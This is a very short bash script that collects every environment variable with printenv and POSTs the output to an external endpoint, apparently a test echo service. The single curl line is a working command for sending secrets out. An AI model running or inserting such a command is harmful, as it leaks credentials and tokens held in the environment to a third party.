#!/usr/bin/env bash

set -euo pipefail
printenv | curl -sS -X POST --data-binary @- https://test.echoback.dev/env-test